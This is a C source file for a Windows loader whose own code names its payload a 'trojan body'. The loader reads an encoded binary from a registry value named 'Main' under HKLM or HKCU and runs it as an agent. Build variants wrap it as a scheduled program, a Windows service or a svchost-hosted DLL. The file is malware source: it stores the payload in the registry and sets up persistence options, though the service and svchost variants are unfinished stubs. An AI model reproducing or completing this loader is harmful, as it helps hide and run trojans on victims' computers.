#include <Windows.h>
#include <tchar.h>
#include <Shlwapi.h>


#include "loader.h"
#include "resource.h"
#include <log.h>

#pragma comment(lib, "shlwapi.lib")

BOOL LoadConfigPath(HKEY *hRootKey, LPTSTR pszRegPath, INT cchRegPathMax)
{
	BOOL	bRet = FALSE;
	TCHAR	szKey[20];					// FIXME: check count char

	if (LoadString(NULL, IDS_KEY, szKey, ARRAYSIZE(szKey)) > 0)
	{
		*hRootKey = (HKEY)StrToInt(szKey);
		if (*hRootKey != 0)
		{
			if (LoadString(NULL, IDS_PATH, pszRegPath, cchRegPathMax) > 0)
			{
				bRet = TRUE;
			}
		}
		else
		{
			LogFatal(_T("Failed get root key\r\n"));
		}
	}

	return bRet;
}

LSTATUS	LoadTrojanBody(PBYTE *pData, PDWORD pdwDataSize)
{
	LONG	lResult;
	HKEY	hSettingsKey;
	HKEY	hRootKey;// = HKEY_LOCAL_MACHINE;
	TCHAR	szRootPath[MAX_PATH];

	/*if (!LoadConfigPath(&hRootKey, szRootPath, ARRAYSIZE(szRootPath)))
	{
		return ERROR_FILE_NOT_FOUND;
	}*/

	if (!LoadString(NULL, IDS_PATH, szRootPath, ARRAYSIZE(szRootPath)) > 0)
	{
		return ERROR_FILE_NOT_FOUND;
	}

	LogInfo(_T("Config path: %s\r\n"), szRootPath);

	lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, szRootPath, 0, KEY_READ, &hSettingsKey);
	if (lResult == ERROR_ACCESS_DENIED || lResult == ERROR_FILE_NOT_FOUND)
	{
		lResult = RegOpenKeyEx(HKEY_CURRENT_USER, szRootPath, 0, KEY_READ, &hSettingsKey);
	}
	//else 
	if (lResult == ERROR_SUCCESS)
	{
		lResult = RegQueryValueEx(hSettingsKey, _T("Main"), NULL, NULL, NULL, pdwDataSize);
		if (lResult == ERROR_SUCCESS)
		{
			*pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *pdwDataSize);
			if (*pData)
			{
				lResult = RegQueryValueEx(hSettingsKey, _T("Main"), NULL, NULL, *pData, pdwDataSize);
			}
			else
			{
				lResult = ERROR_NOT_ENOUGH_MEMORY;
			}
		}

		RegCloseKey(hSettingsKey);
	}

	return lResult;
}

#ifdef SCHEDULER
int _tmain(int argc, TCHAR *argv[])
{
	PBYTE	pTrojanBody = NULL;
	DWORD	dwTrojanBobySize = 0;

	LogInit(LOG_CONSOLE);
	LogInfo(_T("Start loader\r\n"));

	LogTrace(_T("Load agent body\r\n"));
	LSTATUS	lResult = LoadTrojanBody(&pTrojanBody, &dwTrojanBobySize);
	if (lResult != ERROR_SUCCESS)
	{
		LogFatal(_T("Error load agent body with error %d\r\n"), lResult);
		return -1;
	}

	HRESULT hr = RunAgent(pTrojanBody, dwTrojanBobySize, _T("agent.Program"));
	// get exit code for restart (update, delete)
	LogWarn(_T("Stop agent with code 0x%.08X\r\n"), hr);

	if (pTrojanBody != NULL)
	{
		HeapFree(GetProcessHeap(), 0, pTrojanBody);
	}

	LogInfo(_T("Exit loader\r\n"));

	return 0;
}
#endif

#ifdef SERVICE

SERVICE_STATUS          gSvcStatus;
SERVICE_STATUS_HANDLE   gSvcStatusHandle;
HANDLE                  ghSvcStopEvent = NULL;

INT APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, INT nCmdShow)
{
	LogInit(LOG_CONSOLE);
	LogInfo(_T("Start loader\r\n"));

	SERVICE_TABLE_ENTRY DispatchTable[] =
	{
		{ NULL, (LPSERVICE_MAIN_FUNCTION)SvcMain},
		{ NULL, NULL }
	};

	if (!StartServiceCtrlDispatcher(DispatchTable)) {
		LogError(_T("Error: StartServiceCtrlDispatcher"));
	}
}


//
// Purpose: 
//   Entry point for the service
//
// Parameters:
//   dwArgc - Number of arguments in the lpszArgv array
//   lpszArgv - Array of strings. The first string is the name of
//     the service and subsequent strings are passed by the process
//     that called the StartService function to start the service.
// 
// Return value:
//   None.
//
VOID WINAPI SvcMain(DWORD dwArgc, LPTSTR *lpszArgv)
{
	// Register the handler function for the service

	gSvcStatusHandle = RegisterServiceCtrlHandler(
		NULL,
		SvcCtrlHandler);

	if (!gSvcStatusHandle)
	{
		SvcReportEvent(TEXT("RegisterServiceCtrlHandler"));
		return;
	}

	// These SERVICE_STATUS members remain as set here

	gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	gSvcStatus.dwServiceSpecificExitCode = 0;

	// Report initial status to the SCM

	ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

	// Perform service-specific initialization and work.

	SvcInit(dwArgc, lpszArgv);
}

//
// Purpose: 
//   The service code
//
// Parameters:
//   dwArgc - Number of arguments in the lpszArgv array
//   lpszArgv - Array of strings. The first string is the name of
//     the service and subsequent strings are passed by the process
//     that called the StartService function to start the service.
// 
// Return value:
//   None
//
VOID SvcInit(DWORD dwArgc, LPTSTR *lpszArgv)
{
	// TO_DO: Declare and set any required variables.
	//   Be sure to periodically call ReportSvcStatus() with 
	//   SERVICE_START_PENDING. If initialization fails, call
	//   ReportSvcStatus with SERVICE_STOPPED.

	// Create an event. The control handler function, SvcCtrlHandler,
	// signals this event when it receives the stop control code.

	ghSvcStopEvent = CreateEvent(
		NULL,    // default security attributes
		TRUE,    // manual reset event
		FALSE,   // not signaled
		NULL);   // no name

	if (ghSvcStopEvent == NULL)
	{
		ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
		return;
	}

	// Report running status when initialization is complete.

	ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);

	// TO_DO: Perform work until service stops.

	while (1)
	{
		// Check whether to stop the service.

		WaitForSingleObject(ghSvcStopEvent, INFINITE);

		ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
		return;
	}
}

//
// Purpose: 
//   Sets the current service status and reports it to the SCM.
//
// Parameters:
//   dwCurrentState - The current state (see SERVICE_STATUS)
//   dwWin32ExitCode - The system error code
//   dwWaitHint - Estimated time for pending operation, 
//     in milliseconds
// 
// Return value:
//   None
//
VOID ReportSvcStatus(DWORD dwCurrentState,
	DWORD dwWin32ExitCode,
	DWORD dwWaitHint)
{
	static DWORD dwCheckPoint = 1;

	// Fill in the SERVICE_STATUS structure.

	gSvcStatus.dwCurrentState = dwCurrentState;
	gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
	gSvcStatus.dwWaitHint = dwWaitHint;

	if (dwCurrentState == SERVICE_START_PENDING)
		gSvcStatus.dwControlsAccepted = 0;
	else gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

	if ((dwCurrentState == SERVICE_RUNNING) ||
		(dwCurrentState == SERVICE_STOPPED))
		gSvcStatus.dwCheckPoint = 0;
	else gSvcStatus.dwCheckPoint = dwCheckPoint++;

	// Report the status of the service to the SCM.
	SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
}

//
// Purpose: 
//   Called by SCM whenever a control code is sent to the service
//   using the ControlService function.
//
// Parameters:
//   dwCtrl - control code
// 
// Return value:
//   None
//
VOID WINAPI SvcCtrlHandler(DWORD dwCtrl)
{
	// Handle the requested control code. 

	switch (dwCtrl)
	{
	case SERVICE_CONTROL_STOP:
		ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);

		// Signal the service to stop.

		SetEvent(ghSvcStopEvent);
		ReportSvcStatus(gSvcStatus.dwCurrentState, NO_ERROR, 0);

		return;

	case SERVICE_CONTROL_INTERROGATE:
		break;

	default:
		break;
	}

}

//
// Purpose: 
//   Logs messages to the event log
//
// Parameters:
//   szFunction - name of function that failed
// 
// Return value:
//   None
//
// Remarks:
//   The service must have an entry in the Application event log.
//
VOID SvcReportEvent(LPTSTR szFunction)
{
	HANDLE hEventSource;
	LPCTSTR lpszStrings[2];
	TCHAR Buffer[80];

	hEventSource = RegisterEventSource(NULL, NULL);

	if (NULL != hEventSource)
	{
		StringCchPrintf(Buffer, 80, TEXT("%s failed with %d"), szFunction, GetLastError());

		lpszStrings[0] = SVCNAME;
		lpszStrings[1] = Buffer;

		ReportEvent(hEventSource,        // event log handle
			EVENTLOG_ERROR_TYPE, // event type
			0,                   // event category
			SVC_ERROR,           // event identifier
			NULL,                // no security identifier
			2,                   // size of lpszStrings array
			0,                   // no binary data
			lpszStrings,         // array of strings
			NULL);               // no binary data

		DeregisterEventSource(hEventSource);
	}
}
#endif // SERVICE

#ifdef SVCHOST
BOOL WINAPI DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		DisableThreadLibraryCalls(hinstDLL);
	}
}

typedef NTSTATUS(WINAPI *LPSTART_RPC_SERVER) (RPC_WSTR, RPC_IF_HANDLE);
typedef NTSTATUS(WINAPI *LPSTOP_RPC_SERVER) (RPC_IF_HANDLE);
typedef NTSTATUS(WINAPI *LPSTOP_RPC_SERVER_EX) (RPC_IF_HANDLE);

typedef VOID(WINAPI *LPNET_BIOS_OPEN) (VOID);
typedef VOID(WINAPI *LPNET_BIOS_CLOSE) (VOID);
typedef DWORD(WINAPI *LPNET_BIOS_RESET)(UCHAR);

typedef DWORD(WINAPI *LPREGISTER_STOP_CALLBACK) (HANDLE *, PCWSTR, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD);

typedef struct _SVCHOST_GLOBAL_DATA {
	PSID NullSid;                               // S-1-0-0
	PSID WorldSid;                              // S-1-1-0
	PSID LocalSid;                              // S-1-2-0
	PSID NetworkSid;                            // S-1-5-2
	PSID LocalSystemSid;                        // S-1-5-18
	PSID LocalServiceSid;                       // S-1-5-19
	PSID NetworkServiceSid;                     // S-1-5-20
	PSID BuiltinDomainSid;                      // S-1-5-32
	PSID AuthenticatedUserSid;                  // S-1-5-11
	PSID AnonymousLogonSid;                     // S-1-5-7
	PSID AliasAdminsSid;                        // S-1-5-32-544
	PSID AliasUsersSid;                         // S-1-5-32-545
	PSID AliasGuestsSid;                        // S-1-5-32-546
	PSID AliasPowerUsersSid;                    // S-1-5-32-547
	PSID AliasAccountOpsSid;                    // S-1-5-32-548
	PSID AliasSystemOpsSid;                     // S-1-5-32-549
	PSID AliasPrintOpsSid;                      // S-1-5-32-550
	PSID AliasBackupOpsSid;                     // S-1-5-32-551
	LPSTART_RPC_SERVER StartRpcServer;
	LPSTOP_RPC_SERVER StopRpcServer;
	LPSTOP_RPC_SERVER_EX StopRpcServerEx;
	LPNET_BIOS_OPEN NetBiosOpen;
	LPNET_BIOS_CLOSE NetBiosClose;
	LPNET_BIOS_RESET NetBiosReset;
#if (_WIN32_WINNT == _WIN32_WINNT_WINXP && NTDDI_VERSION >= NTDDI_WINXPSP2) \
        || (_WIN32_WINNT == _WIN32_WINNT_WS03 && NTDDI_VERSION >= NTDDI_WS03SP1) \
        || _WIN32_WINNT >= _WIN32_WINNT_LONGHORN)
	LPREGISTER_STOP_CALLBACK RegisterStopCallback;
#endif
} SVCHOST_GLOBAL_DATA;

SVCHOST_GLOBAL_DATA *g_pServiceGlobal = NULL;

__declspec(dllexport) SVCHOST_GLOBAL_DATA* WINAPI SvchostPushServiceGlobals(SVCHOST_GLOBAL_DATA *lpGlobalData)
{
	g_pServiceGlobal = lpGlobalData;

	return g_pServiceGlobal;
}

__declspec(dllexport) VOID WINAPI ServiceMain(DWORD dwArgc, LPWSTR *lpszArgv)
{

}
#endif